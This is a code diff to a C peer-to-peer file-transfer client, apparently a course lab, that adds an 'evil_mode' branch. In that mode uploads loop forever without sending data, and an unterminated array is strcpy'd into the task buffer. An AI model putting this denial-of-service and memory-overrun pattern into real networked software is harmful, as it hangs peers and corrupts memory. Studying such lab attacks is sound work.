@@ -202,26 +202,35 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
     unsigned headpos = (t->head % TASKBUFSIZ);
     unsigned tailpos = (t->tail % TASKBUFSIZ);
     ssize_t amt;
+    char str[5]  = {'a','a','a','a','a'};
 
-    if (t->head == t->tail)
-        return TBUF_END;
-    else if (headpos < tailpos)
-        amt = write(fd, &t->buf[headpos], tailpos - headpos);
-    else
-        amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);
+    if(evil_mode) {
 
-    if (amt == -1 && (errno == EINTR || errno == EAGAIN
-              || errno == EWOULDBLOCK))
-        return TBUF_AGAIN;
-    else if (amt == -1)
-        return TBUF_ERROR;
-    else if (amt == 0)
-        return TBUF_END;
-    else {
-        t->head += amt;
-        t->total_written += amt;
+        strcpy(&t->buf[headpos],str);
         return TBUF_OK;
-    }
+
+    } else {
+
+        if (t->head == t->tail)
+            return TBUF_END;
+        else if (headpos < tailpos)
+            amt = write(fd, &t->buf[headpos], tailpos - headpos);
+        else
+            amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);
+
+        if (amt == -1 && (errno == EINTR || errno == EAGAIN
+                  || errno == EWOULDBLOCK))
+            return TBUF_AGAIN;
+        else if (amt == -1)
+            return TBUF_ERROR;
+        else if (amt == 0)
+            return TBUF_END;
+        else {
+            t->head += amt;
+            t->total_written += amt;
+            return TBUF_OK;
+        }
+   } 
 }
 
 
@@ -747,8 +756,9 @@ static void task_upload(task_t *t)
     //printf("Requested t->buf length: %d\n", t->tail);
     if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
         error("* Odd request %.*s\n", t->tail, t->buf);
-        goto exit;
+       	goto exit;
     }
+
     //printf("Requested filename length: %d\n", strlen(t->filename));
     t->head = t->tail = 0;
 
@@ -757,7 +767,7 @@ static void task_upload(task_t *t)
 
     //first check that file is a regular file
     if((s.st_mode & S_IFMT) == S_IFREG) {
-	
+        
         //then open current directory and check that the file is in current directory
         //by checking inode numbers
 
@@ -787,21 +797,33 @@ static void task_upload(task_t *t)
     }
 
     message("* Transferring file %s\n", t->filename);
-    // Now, read file from disk and write it to the requesting peer.
-    while (1) {
-        int ret = write_from_taskbuf(t->peer_fd, t);
-        if (ret == TBUF_ERROR) {
-            error("* Peer write error");
-            goto exit;
+
+    if(evil_mode) {
+        
+        //write infinitely from task buffer into peer_fd
+        //In evil mode write from task buf copies infinitely
+        while(1) {
+            write_from_taskbuf(t->peer_fd, t);
         }
 
-        ret = read_to_taskbuf(t->disk_fd, t);
-        if (ret == TBUF_ERROR) {
-            error("* Disk read error");
-            goto exit;
-        } else if (ret == TBUF_END && t->head == t->tail)
-            /* End of file */
-            break;
+    } else {
+
+            // Now, read file from disk and write it to the requesting peer.
+            while (1) {
+                int ret = write_from_taskbuf(t->peer_fd, t);
+                if (ret == TBUF_ERROR) {
+                    error("* Peer write error");
+                    goto exit;
+                }
+
+                ret = read_to_taskbuf(t->disk_fd, t);
+                if (ret == TBUF_ERROR) {
+                    error("* Disk read error");
+                    goto exit;
+                } else if (ret == TBUF_END && t->head == t->tail)
+                    /* End of file */
+                    break;
+            }
     }
 
     message("* Upload of %s complete\n", t->filename);
